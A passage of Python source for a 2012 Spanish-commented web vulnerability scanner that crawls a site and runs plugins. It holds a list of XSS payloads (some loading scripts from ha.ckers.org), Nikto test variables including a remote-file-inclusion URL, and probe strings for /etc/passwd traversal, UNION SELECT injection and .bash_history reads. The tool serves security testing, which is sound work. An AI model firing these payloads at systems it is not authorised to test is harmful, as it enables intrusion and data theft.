			'<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas<![CDATA[cript:alert(12345);">',
			'<XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>',
			'<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>',
			'<!--#exec cmd="/bin/echo \'<SCRIPT SRC\'"--><!--#exec cmd="/bin/echo \'=http://ha.ckers.org/xss.js></SCRIPT>\'"-->',
			'<? echo(\'<SCR)\';',
			'<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert(12345)&lt;/SCRIPT&gt;">',
			'<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert(12345);+ADw-/SCRIPT+AD4-',
			'<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
			'<SCRIPT a=">" \'\' SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
			'<SCRIPT "a=\'>\'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
			'<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
			'<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
		]

		# dict puede cambiar
		get = cplist(RUN['get'])

		# para cada end point localizado
		for e in get:

			epoint = RUN['get'][e]
			path = norm_url(epoint['path'])
			params = epoint['params']
			queries = []

			# fuzeamos para cada parametro y palabra
			for q in mix_params(params):
				for w in words: 

					# url encode basico
					w = re.sub('\s+', '+', w)
					w = re.sub('&', '%26', w)
					query = re.sub('#inj#', w, q)
					ins_list(queries, query)

					# construimos query segura
					w = urllib.quote_plus(w)
					query = re.sub('#inj#', w, q)
					ins_list(queries, query)

			# cola auxiliar
			aux = queries

			# alternativas url encoding
			if CFG['url_encode']: 
				for q in q_urlenc(queries): 
					ins_list(aux, q)

			# alternativas utf8
			if CFG['utf8_encode']: 
				for q in q_utf8enc(queries):
					ins_list(aux, q)

			# comprobamos combinaciones
			for query in sorted(aux): 

				# normalizamos y ejecutamos
				url = path + '?' +  query
				chk_url_thread(url)
				
				# vulnerable? siguiente param
				if url in VULNS[117]['output']: 
					break

		# esperamos hasta que termine
		wait_threads()


	def report(self):
		PluginBaseExt.report(self, 
			tmpl2= '-' * 80 + "\n%s\n" + '-' * 80 + "\n")


##################################################################################################################
# Plugin: Run Nikto Tests
##################################################################################################################
class PluginNiktoTests(PluginBaseExt):

	""" ejecuta tests de nikto (db_tests) """

	# variables nikto 
	nikto_vars = \
	{ 
		'@CGIDIRS': \
		[
			'/cgi.cgi/',
			'/webcgi/',
			'/cgi-914/',
			'/cgi-915/',
			'/bin/',
			'/cgi/',
			'/mpcgi/',
			'/cgi-bin/',
			'/ows-bin/',
			'/cgi-sys/',
			'/cgi-local/',
			'/htbin/',
			'/cgibin/',
			'/cgis/',
			'/scripts/',
			'/cgi-win/',
			'/fcgi-bin/'
			'/cgi-exe/',
			'/cgi-home/', 
			'/cgi-perl/', 
			'/scgi-bin/',
		],

		'@NUKE': \
		[
			'/',
			'/postnuke/',
			'/postnuke/html/',
			'/modules/',
			'/phpBB/',
			'/forum/',
		],

		'@ADMIN': \
		[
			'/admin/',
			'/adm/',
			'/administrator/',
		],

		'@USERS': \
		[
			'adm', 
			'bin', 
			'daemon', 
			'ftp', 
			'guest', 
			'listen', 
			'lp', 
			'mysql', 
			'noaccess', 
			'nobody', 
			'nobody4', 
			'nuucp', 
			'operator',
			'root', 
			'smmsp', 
			'smtp', 
			'sshd', 
			'sys', 
			'test', 
			'unknown', 
			'uucp', 
			'web', 
			'www',
		],

		'@PHPMYADMIN': \
		[
			'/3rdparty/phpMyAdmin/',
			'/phpMyAdmin/',
			'/3rdparty/phpmyadmin/',
			'/phpmyadmin/',
			'/pma/',
		],

		'@FCKEDITOR': \
		[
			'/FCKeditor/',
			'/Script/fckeditor/',
			'/sites/all/modules/fckeditor/fckeditor/',
			'/modules/fckeditor/fckeditor/',
			'/class/fckeditor/',
			'/inc/fckeditor/',
			'/sites/all/libraries/fckeditor/',
		],

		'@CRYSTALREPORTS': \
		[
			'/', 
			'/CrystalReports/', 
			'/crystal/', 
			'/businessobjects/', 
			'/crystal/enterprise10/', 
			'/crystal/Enterprise10/ePortfolio/en/',
		],

		'@RFIURL': [ 'http://cirt.net/rfiinc.txt?' ],
	}

	db_tests = {}
	regexp = ''
	urls = {}
	runonce = False


	def __init__(self, name, desc):

		# llamamos a constructor padre
		PluginBaseExt.__init__(self, name, desc)

		# no configurado? salimos
		if not CFG['db_tests']: return

		# abrimos fichero 
		file = open(CFG['db_tests'])
		reader = csv.reader(file)
		self.db_tests = {}

		# leemos linea a linea
		for line in reader:  

			if len(line) != 13: continue

			# guardamos linea
			id = line[0]
			self.db_tests[id] = line

		# cerramos fichero
		file.close()

		# construimos exp reg de busqueda variables
		self.regexp = '|'.join(self.nikto_vars.keys())
		self.regexp = '(' + self.regexp + ')'

		# marcamos para ejecutar una sola vez
		self.runonce = False


	def search(self, url, code, headers, content):

		if code in [401, 404] or self.runonce: return

		# buscamos en urls nikto
		if url in self.urls:

			id = self.urls[url]
			test = self.db_tests[id]
			msg = test[10]

			# es un code o contenido ?
			enc = (int(test[5]) == code) \
				if test[5] in [ '200', '301', '302', '401', '403' ] \
					else re.search(test[5], content, re.M)

			# segunda opcion? pendiente
			if test[6]: 

				enc = enc or (int(test[6]) == code) \
					if test[6] in [ '200', '301', '302', '401', '403' ] \
						else re.search(test[6], content, re.M)

			if enc: 

				# registramos
				self.asset(msg, url)
				idx = "%s: %s" % (msg, url)
				asset_vuln(116, idx)


	def replace_var(self, urls, var_name, var_values):

		r = []

		# urls sustituyendo valores 
		for url in urls: 
			r.extend(map(lambda x: re.sub(var_name, x, url), 
				var_values))

		return uniq(r)


	def fuzz(self):

		global CFG

		# solo se ejecuta la primera vez
		if self.runonce: return

		# llamada metodo padre
		PluginBase.fuzz(self)

		# copiamos lista 
		dirs = cplist(self.nikto_vars['@CGIDIRS'])

		# descartamos cgidirs no existentes 
		for dir in dirs:

			url = norm_url(dir)
			code, headers, content = NAV.http(url, 'HEAD')

			# descartamos?
			if code in [ 404, 501 ]: 
				self.nikto_vars['@CGIDIRS'].remove(dir)

		# procesamos cada linea de db_tests
		for id in self.db_tests:

			# nos quedamos con el campo url
			test = self.db_tests[id]
			url = test[3]
			method = test[4] if test[4] else 'GET'

			# control de errores
			if not url: continue

			# contiene variables de reemplazo?
			vars = re.findall(self.regexp, url)
			urls_tmp = [url]

			# reemplazamos variables
			for var in vars: 
				urls_tmp = self.replace_var(
					urls_tmp, var, 
					self.nikto_vars[var])

			# procesamos
			for url_tmp in urls_tmp: 

				# / al principio?
				if url_tmp[0] != '/': 
					url_tmp = '/' + url_tmp

				# construimos url
				url_tmp = RUN['scope'] + url_tmp

				# registramos 
				self.lck.acquire()
				self.urls[url_tmp] = id
				self.lck.release()

				# probamos
				chk_url_thread(url_tmp, 
					method, src=self)

		# esperamos a que finalize
		wait_threads()

		# marcamos como ejecutado
		self.runonce = True


###########################
# funciones auxiliares
###########################

""" superado tiempo maximo """
def max_time(signum, frame):
	raise TimeoutException

class TimeoutException(Exception): 
	pass


""" auxiliar debug """
def pinfo(msg): 

	LCK['io'].acquire()
	print msg
	LCK['io'].release()


""" auxiliar print debug """
def pdebug(msg): 

	if CFG['debug']: 
	
		LCK['io'].acquire()
		print msg
		LCK['io'].release()


""" auxiliar print error """
def perror(msg): 
	print ">>> ERROR (%s)" % msg


""" auxiliar print abort """
def pabort(msg): 
	
	print ">>> ABORT (%s)" % msg
	if CFG['on_error_exit']: 
		os._exit(-1) 


""" auxiliar print """
def pout(msg): 

	print msg

	# fichero salida
	fname = CFG['dir'] + 'result.txt'

	# salvamos a fichero
	f = open(fname, 'a')
	f.write(msg + "\n")
	f.close()


""" elimina duplicados y ordena lista """ 
def uniq(x): 
	return list(set(sorted(x)))


""" inserta valor en lista si no existe """ 
def ins_list(list, val, lck=None): 

	# ya almacenado?
	if not val in list: 

		# control concurrencia?
		if lck: 
			lck.acquire()
			list.append(val)
			lck.release()

		else: list.append(val)


""" elimina valor de lista """ 
def del_list(list, val, lck=None): 

	# ya almacenado?
	if val in list: 

		# control concurrencia?
		if lck: 
			lck.acquire()
			list.remove(val)
			lck.release()

		else: list.remove(val)


""" inserta lista en diccionario """ 
def ins_dict(dict, key, val, lck=None): 

#	if not dict or not key: return

	# creamos estructuras de datos si no existen
	if not key in dict.keys(): 
		dict[key] = []

	# insertamos valor en lista
	ins_list(dict[key], val, lck)


""" para copia de lista """
def cplist(list): 
	
	new_list = []
	new_list.extend(list) 

	return new_list


""" volcamos estructura a fichero """
def save_var(var, name):

	fname = CFG['dir'] + name + '.dat'
	f = open(fname, 'wb')
	pickle.dump(var, f) 
	f.close()


""" cargamos resultados de fichero """
def load_var(name):

	fname = CFG['dir'] + name + '.dat'
	f = open(fname, 'rb')
	var = pickle.load(f)
	f.close()

	return var


""" volcamos resultados a ficheros """
def save_state():

	# salvamos crawler
	CRAWLER.save_state()

	# salvamos navegacion
	NAV.save_state()

	# salvamos plugins 
	for x in PLUGINS: 
		PLUGINS[x].save_state()

	# variables globales
	save_var(VULNS, 'vulns')
	save_var(RUN, 'run')
	save_var(CFG, 'cfg')


""" cargamos resultados de ficheros """
def load_state():

	global VULNS
	global RUN
	global CFG

	# crawler y navegacion
	CRAWLER.load_state()
	NAV.load_state()

	# cargamos resultados parciales plugins
	for x in PLUGINS: 
		PLUGINS[x].load_state()

	# variables globales
	VULNS = load_var('vulns')
	#CFG = load_var('cfg')
	RUN = load_var('run')


""" alarma auto-save cada x segs. """
def auto_save(signum, frame):

	# esperamos hasta que termine
	wait_threads()

	# salvamos 
    	pdebug('(Salvando estado...)')
	save_state()
	signal.alarm(CFG['auto_save_int'])


""" registramos vulnerabilidad """
def asset_vuln(id, result):

	global VULNS

	ins_list(VULNS[id]['output'], 
		result, LCK['vulns'])


""" genera fichero a partir de url """
def url2fname(url):
	return CFG['dir'] + url.replace(
		RUN['scope'], '/').replace('/', ':')
	

""" calcula el directorio a partir de url """
def urldir(url): 
	return url if url[-1] == '/' \
		else '/'.join(url.split('/')[:-1]) + '/'


""" reformatea url con params para indice """
def gen_idx_url_query(url):

	# generamos indice 
	idx = re.sub('\?', ' [ ', url) 
	idx = re.sub('&amp;', '&', idx)
	idx = re.sub('\w+=0[&$]', '', idx)
	idx = re.sub('=.*?&', ', ', idx)
	idx = re.sub('=.*$', ' ]', idx)

	return idx


""" combinaciones parametros para inyeccion """
def mix_params(params):

	# ignoramos submit
	if 'submit' in params: 
		params.remove('submit')

	# construimos combinaciones 
	queries = [ map(lambda x: x + ('=#inj#' if x == p else '=0'), 
		params) for p in params ]

	# todos a la vez ?
	ins_list(queries, map(lambda x: x + '=#inj#', params))

	return [ '&'.join(q) for q in queries ]


""" genera queries altarnativas segun charset """
def qenc(queries, enc_chrs):

	aux = []

	for query in queries: 

		q_enc = query

		# ..%2f -> ../
		for src, dst in enc_chrs: 

			q_enc_par = query.replace(src, dst)
			ins_list(aux, q_enc_par)
			q_enc = q_enc.replace(src, dst)

		# %2e%2e%2f -> ../
		ins_list(aux, q_enc)

	return aux


""" genera queries alternativas en urlenc """
def q_urlenc(queries):
	return qenc(queries, CFG['urlenc_chrs'])


""" genera queries alternativas en utf8 """
def q_utf8enc(queries):
	return qenc(queries, CFG['utf8enc_chrs'])


""" parseamos url """
def parse_url(url):

	# parseamos 
	o = urlparse.urlparse(url)

	scheme = o[0] if o[0] else 'http'
	netloc = o[1]
	path = o[2] if o[2] else '/'
	query = '?' + o[4] if o[4] else ''

	return (scheme, netloc, path, query)


""" normalizamos urls """ 
def norm_url(url, href=None): 

	# parametros por defecto
	if not href: href = RUN['scope']

	# quitamos caracteres escapados 
	url = url.replace('\/', '/')

	# quitamos caracteres escapados 
	url = url.replace('&amp;', '&')

	# quitamos ?? de path
	url = url.replace('??', '?')

	# fuera caracteres no validos
	url = re.sub('[^%s]' % url_charset, '', url)

	# aniadimos base en link si necesario
	url = urlparse.urljoin(href, url)

	# quitamos #ref 
	url = urlparse.urldefrag(url)[0]

	# descomponemos la url
	scheme, netloc, path, query = parse_url(url)

	# quitamos caracteres raros 
	netloc = re.sub('[\(\)\[\]]', '', netloc)

	# quitamos caracteres raros 
	netloc = re.sub('\.$', '', netloc)

	# quitamos // de path
	path = re.sub('/+', '/', path)

	# / final si no ext
	if re.match(r'^.*/[^\./\?]+$', path): 
		path = path +  '/'

	# reconstruimos
	url = scheme + '://' + netloc + path + query

	# evitamos http://blah/info.php/?blah....
	url = re.sub('/\?', '?', url)
	
	# evitamos http://blah/pag.php?blah& 
	url = re.sub('&$', '', url)

	return url 


""" descartamos las urls seleccionadas """
def ignore_url(url):

	# comparamos con la lista negra 
	for regexp in CFG['excl_url']: 
		if re.search(regexp, url): 
			return True

	return False 


""" descartamos la descarga de extensiones binarias """
def ignore_ext(url):
	return not CFG['download_all'] and re.search( \
		r'(' + '|'.join(RUN['exts_excl']).replace( \
		'.', '\.') + ')$', url, re.I)


""" descartamos el analisis de mime types binarios """
def ignore_mtype(type):
	return type in CFG['excl_mime']


""" la url este dentro del alcance del analisis? """ 
def in_scope(url):

	# quitamos info auth
	url = re.sub(r'/.*?:.*?@', '/', url)

	# coincide con la url base ?
	return url[0:len(RUN['scope'])] == RUN['scope']


""" buscamos enlaces """
def search_links(content, flag=True):

	# variables locales
	links = []
	exts = '|'.join(CFG['exts_pag']).replace('.', '\.')
	not_backslash = url_charset.replace('\\\\', '')

	# expresiones regulares de busqueda
	regexps = \
	[
		# Location: http://mydom.com/index.do
		r'Location:\s*(?P<url>https?://[%s]+)' % url_charset, 
		
		# html: href="blah.html" /  href='blah.html'
		r'href\s*=\s*([\'"])(?P<url>[%s]+?[%s])\1' % (url_charset, not_backslash),

		# html: src="preload.js", action="post.php" src='preload.js', action='post.php'
		r'(?:src|action)\s*=\s*([\'"])(?P<url>[%s]+?[%s])\1' % (url_charset, not_backslash),

		# html: <form method="post" action="http://dom/x.cgi" ...
		r'action\s*=\s*([\'"])(?P<url>[%s]+?[%s])\1' % (url_charset, not_backslash),

		# html: <META http-equiv="refresh" content="30;url=index.php">
		r'<META .*url=(?P<url>[%s]+?)["\']' % url_charset, 

		# html: header("location:ecaptcha.html");
		r'header\(([\'"])location:(?P<url>[%s]+?[%s])\1\)' % (url_charset, not_backslash),

		# css:  url("img/bg.png"), url('img/bg.png'), url(img/bg.png)
		r'url\(([\'"])?(?P<url>[%s]+?[%s])\1\)' % (url_charset, not_backslash),

		# javascript: url=a.href.replace('index.php','content.php');
		r'([\'"])(?P<url>(?:[\w\.\-]+/)?[\w\-]+(?:%s))\1' % exts, 

		# javascript: _page_copyTune="copyTune.do";e
		r'\w+\s*=\s*([\'"])(?P<url>\w+(?:%s))\1' % exts, 
	]

	# expresiones que suelen generar falsos positivos
	if flag: regexps.append(r'(?P<url>https?://\w+(?:\.\w+)*(?:/[%s]+)?)' % url_charset)

	# buscamos
	for regexp in regexps:
		for m in re.finditer(regexp, content, re.M | re.I):
			links.append(m.group('url'))

	return uniq(links)


""" espera a que se libere una tarea """
def wait_thread(): 

	# esperamos a tareas libres
	while LCK['threads'] == CFG['num_threads']: 
		time.sleep(CFG['req_interval'])


""" espera hasta que se liberen todas las tareas """
def wait_threads(): 

	# esperamos a tareas libres
	while LCK['threads']:
		time.sleep(CFG['req_interval'])


""" aux threading temporal """
def chk_url_thread(url, href=None, depth=0, src=None): 

	# esperamos una tarea libre
	wait_thread()

	# incrementamos contador
	LCK['count'].acquire()
	LCK['threads'] += 1
	LCK['count'].release()

	# lanzamos hilo
	thread.start_new_thread(chk_url, 
		(url, href, depth, src, True))


""" si existe url, hace crawling (version thread) """
def chk_url(url, href=None, depth=0, src=None, thread=False): 

	try:
		# ya visitada?
		code = NAV.code(url)
		if not code:

			# dentro del ambito de analisis?
			if in_scope(url) and not (ignore_url(url) or ignore_ext(url)): 

				# comprobamos item 
				code, headers = NAV.head(url)
				pdebug(">>> Probando: %s (%d)" % (url, code))

				# realmente no es un dir ?
				if code == 404 and url[-1] == '/':

					# quitamos '/' final 
					url = url[:-1]

					# comprobamos item 
					code, headers = NAV.head(url)
					pdebug(">>> Probando: %s (%d)" % (url, code))

				# ejectuamos todos los plugins
				for k in PLUGINS: 
					if CFG['plugins'][k]: 
						PLUGINS[k].search_url(url, code, headers)

				# si existe, mime valido y es accesible navegamos
				if not code in [ 400, 401, 403, 404 ]:
					if not ignore_mtype(url):
						CRAWLER.crawl(url, href, depth, src)

	except Exception as e: 

		traceback.print_exc(file=sys.stdout)
		pabort('Error de ejecucion! [ %s ]' % e)

	finally:

		if thread: 

			# liberamos contador
			LCK['count'].acquire()
			LCK['threads'] -= 1
			LCK['count'].release()


""" genera informe """
def report():

	# resumen
	pout("\n\nRESULTADOS")
	pout("==========\n")
	pout("* Resumen:\n")
	pout("\t- URL analizada: %s" % RUN['index'])
	pout("\t- Hora inicio: %s" % RUN['timestamp'])
	pout("\t- Version servidor: %s" % RUN['server_version'])
	pout("\t- Hora servidor: %s " % RUN['timestamp'])
	pout("\n\n* Configuracion:\n")

	# configuracion
	for k in sorted(CFG): 
		pout("\t- %s -> %s" % (k, CFG[k]))

	# vulnerabilidades 
	pout("\n\n* Vulnerabilidades:\n")
	for vuln in sorted(VULNS.values()): 
		if vuln['output']:

			pout("\t+ %s\n" % vuln['desc'])
			for e in vuln['output']: 
				pout("\t\t- %s" % e)

			pout("\n")

	# entry points
	pout("\n\n* Entry Points:\n")
	epoints = RUN['get'].keys() + RUN['post'].keys()
	for epoint in sorted(epoints): 
		pout("\t\t- %s" % epoint)

	# mostramos resultados ejecucion plugins
	pout("\n\n* Plugins:\n")
	for plugin in sorted(PLUGINS): 
		if CFG['plugins'][plugin]: 
			PLUGINS[plugin].report()

	# estadisticas crawler 
	pout("* Crawler:\n")
	CRAWLER.report()

	# estadisticas navegacion
	pout("\n* Estadisticas Navegacion:\n")
	NAV.report()

	pout("(fin report)\n")


""" imprimimos banner de uso """
def usage(): 

	# mostramos banner
	print "\n(w) 'Crawler v0.4' - (c) 2012 J.Ignacio Bravo\n"
	print "usa: python wscan.py [url]\n"


""" inicializa scan """
def init(): 

	global NAV
	global CRAWLER
	global RUN

	# nivel de recursion
	MAX_RECURSION = 10000

	# maxima recursion
	sys.setrecursionlimit(MAX_RECURSION)

	# uncontentered 
	sys.stdout = os.fdopen(sys.stdout.fileno(), 'w', 0)

	# inicializamos crawler
	RUN['index'] = norm_url(CFG['index'])

	# saneamos url y generams url base 
	scheme, netloc, path, query = parse_url(RUN['index'])
	path = re.sub('/[^/]*$',  '', path)
	RUN['scope'] = scheme + '://' +  netloc +  path

	# directorio de salida ? 
	CFG['dir'] = CFG['dir'] + '/' + netloc + '/'
	if not os.access(CFG['dir'], os.F_OK): 
		os.makedirs(CFG['dir'])

	# navegador
	NAV = Navigator()

	# inicializamos crawler
	CRAWLER = Crawler()


""" scan index """
def scan(index): 

	# comenzamos a navegar
	pinfo("* Crawling...")
	chk_url(index)

	# ejecutamos plugins
	pinfo("* Ejecutando plugins...")
	for k in sorted(PLUGINS):
		if CFG['plugins'][k]: 

			PLUGINS[k].check()
			PLUGINS[k].fuzz()


""" comprobaciones de servidor """
def check_server(): 

	global RUN

	# comprobamos la conectividad 
	code, headers, content = NAV.http(RUN['index'], 'HEAD')
	pinfo("+ Comprobando conectividad: %s" % 
		('ok' if code and headers else 'error'))

	# error de conexion?  salimos!
	if not code or not headers: 
		pabort('Error de conexion!')

	# version del servidor 
	RUN['server_version'] = headers.get('Server')
	pinfo("+ Servidor remoto: %s" % RUN['server_version'])

	# hora remota
	RUN['server_timestamp'] = headers.get('Date')
	pinfo("+ Timestamp remoto: %s" % RUN['server_timestamp'])

	# hora local
	RUN['timestamp'] = time.asctime()
	pinfo("+ Timestamp local: %s" % RUN['timestamp'])

	# url que no existe 
	url_fake = RUN['scope']  + '/blah_324zz.html'

	# comprobamos pagina de error
	code, headers, content = NAV.http(url_fake, 'HEAD')
	pinfo("+ Comprobando pagina de error (404): %s" %
		('ok' if code == 404 else 'error'))

	# no devuelve error 404? salimos!
	if code != 404: 
		pabort('El servidor no devuelve error!') 

	# en algunos servers exts devuelven 500
	pinfo("+ Comprobando extensiones problematicas...")
	for e in CFG['exts_err']:

		# ya marcada como excluida?
		if e in RUN['exts_excl']: continue
		
		code, headers, content = NAV.http(url_fake + e, 'HEAD')
		pdebug(">>> Probando: %s -> %d" % (e, code))

		# excluimos extension 
		if code != 404: 
			RUN['exts_excl'].append(e)


	pinfo('+ Comprobando protecciones:')

	# urls generalmente bloqueadas por fw
	urls_fake = \
	[
		'?p=../../etc/passwd',
		'?p=UNION+ALL+SELECT+@version',
		'?p=<script>alert(1)</script>',
		'/../.bash_history',
	]

	for url in urls_fake: 

		# url que no existe 
		url_fake = RUN['scope']  + '/blah_423qq' + url

		# comprobamos pagina de error
		code, headers, content = NAV.http(url_fake, 'HEAD')
		pdebug(">>> Probando: %s -> %d" % (url_fake, code))

		# no devuelve error 404? salimos!
		if code != 404: 
			# pabort('Posible mecanismo de proteccion!') 
			pinfo('Posible mecanismo de proteccion!') 

	# login form ?
	if CFG['custom_login']: custom_login()


""" continuamos sesion anterior """
def resume(): 

	# continuamos ejecucion anterior?
	if CFG['auto_resume']:
		if os.access(CFG['dir'] + 'crawler_crawled.dat', os.F_OK):

			pdebug(">>> Cargando sesion...")
			load_state()

	# auto-save cada x segundos
	if CFG['auto_save']: 

		signal.signal(signal.SIGALRM, auto_save)
		signal.alarm(CFG['auto_save_int'])

	# tiempo maximo de ejecucion ?
	if CFG['max_time']:

		signal.signal(signal.SIGALRM, max_time)
		signal.alarm(CFG['max_time'])


""" registramos plugins """
def register_plugins():

	global PLUGINS

	PLUGINS[1001] = PluginSearchRobots('plugin_search_robots', 'search robots')
	PLUGINS[1002] = PluginSearchGoogle('plugin_search_google', 'search google')
	PLUGINS[1004] = PluginSearchForms('plugin_search_forms', 'search forms')
	PLUGINS[1005] = PluginSearchWebServer('plugin_search_web_server', 'search web server')
	PLUGINS[1006] = PluginDirectoryListing('plugin_directory_listing', 'directory listing')
	PLUGINS[1007] = PluginSearchDefaultPage('plugin_search_default_page', 'search default page')
	PLUGINS[1008] = PluginSearchBackups('plugin_search_backups', 'search backups')
	PLUGINS[1009] = PluginSearchLogs('plugin_search_logs', 'search logs')
	PLUGINS[1010] = PluginSearchKnownPages('plugin_search_known_pages', 'search known pages')
	PLUGINS[1011] = PluginFuzz('plugin_fuzzing', 'fuzzing')
	PLUGINS[1012] = PluginSearchMails('plugin_search_mails', 'search mails')
	PLUGINS[1013] = PluginSearchComments('plugin_search_comments', 'search comments')
	PLUGINS[1014] = PluginSearchInfoLeaks('plugin_search_info_leaks', 'search info leaks')
	PLUGINS[1015] = PluginSearchErrors('plugin_search_errors', 'search errors')
	PLUGINS[1016] = PluginCheckAuth('plugin_check_auth', 'check auth')
	PLUGINS[1017] = PluginTestingHTTPMethods('plugin_testing_http_methods', 'testing http methods')
	PLUGINS[1018] = PluginTestingArbitraryHTTPMethods('plugin_testing_arbitrary_http_methods', 'testing arbitrary http methods')
	PLUGINS[1019] = PluginTestingHEADAccessControlBypass('plugin_testing_head_access_control_bypass', 'testing head access control bypass')
	PLUGINS[1020] = PluginTestingTRACE('plugin_testing_trace', 'testing trace method')
	PLUGINS[1021] = PluginTestingFileExtensionsHandling('plugin_testing_file_extensions_handling', 'testing for file extensions handling')
	PLUGINS[1022] = PluginSearchCookies('plugin_search_cookies', 'search cookies')
	PLUGINS[1023] = PluginDetectedMultipleWebServers('plugin_detected_multiple_web_servers', 'detected multiple web servers')
	PLUGINS[1024] = PluginSearchPasswordFields('plugin_search_password_fields', 'search password fields')
	PLUGINS[1025] = PluginPossibleUsernameOrPasswordDisclosure('plugin_possible_username_or_password_disclosure', 'possible username or password disclosure')
	PLUGINS[1026] = PluginApacheHttpOnlyCookieDisclosure('plugin_apache_httponly_cookie_disclosure', 'apache httponly cookie disclosure')
	PLUGINS[1027] = PluginDirectoryTraversal('plugin_directory_traversal', 'directory traversal')
	PLUGINS[1028] = PluginSQLInjection('plugin_sql_injection', 'sql injection')
	PLUGINS[1029] = PluginXSS('plugin_xss', 'cross site scripting (xss)')
	PLUGINS[1030] = PluginNiktoTests('plugin_nikto_tests', 'nikto tests')


""" funcion principal """
def main(argv): 

	global CFG

	# banner
	usage()

	# paramoetros de entrada ?
	if len(argv) < 2: 
		pabort('Parametros incorrectos')

	# empieza por http ?
	if not re.match('^https?://.*$', argv[1]):
		argv[1] = 'http://' + argv[1]
		
	CFG['index'] = argv[1] 

	# inicializa
	pinfo("* Inicializando...")
	init()

	# comprobamos servidor
	pinfo("* Comprobando servidor...")
	check_server()

	# registramos plugins
	pinfo("* Registrando plugins...")
	register_plugins()

	# resume
	pinfo("* Buscando ejecuciones anteriores...")
	resume()

	try:
		for i in range(0, CFG['max_iter']):

			# scan site
			RUN['exit'] = True
			scan(RUN['index'])
			if RUN['exit']: break

	except KeyboardInterrupt: 
		pinfo("Pulsado ctrl+c ! (cancelando...)")

	except TimeoutException: 
		pinfo("Superado tiempo maximo!")

	# desconectamos alarma
	signal.alarm(0)

	# esperamos a que finalize tareas
	wait_threads()

	# salvamos resultados
	pinfo("* Salvando estado...")
	save_state()

	# generamos informe
	pinfo("* Generando informe...")
	report()


#########################
# main
#########################
if __name__ == "__main__":
	main(sys.argv)

